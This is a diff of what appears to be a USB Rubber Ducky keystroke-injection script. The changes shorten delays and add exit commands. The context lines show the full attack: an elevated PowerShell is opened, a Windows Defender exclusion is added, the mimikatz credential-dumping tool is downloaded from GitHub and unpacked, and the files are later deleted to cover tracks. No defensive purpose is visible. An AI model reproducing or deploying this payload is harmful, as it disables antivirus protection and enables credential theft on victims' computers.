@@ -16,14 +16,14 @@ DELAY 500
 STRING powershell
 DELAY 250
 ENTER
-DELAY 1500 
+DELAY 1000 
 STRING Start-Process powershell -Verb runAs
 ENTER
 DELAY 500
 TAB
 TAB
 ENTER
-DELAY 1000  
+DELAY 500  
 STRING Set-MpPreference -ExclusionPath "C:\Windows\System32\mimikatz"
 ENTER
 DELAY 500
@@ -32,10 +32,10 @@ ENTER
 DELAY 300  
 STRING Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile ".\mimikatz_trunk.zip"
 ENTER
-DELAY 5000  
+DELAY 2000  
 STRING Expand-Archive -Path ".\mimikatz_trunk.zip" -DestinationPath ".\mimikatz"
 ENTER
-DELAY 2000  
+DELAY 1000  
 STRING Remove-Item -Path ".\mimikatz_trunk.zip"
 ENTER
 DELAY 500 
@@ -64,4 +64,9 @@ STRING Remove-Item -Path "C:\Windows\System32\mimikatz"
 ENTER
 DELAY 500
 STRING t
+ENTER
+STRING exit
+ENTER
+DELAY 250
+STRING exit
 ENTER
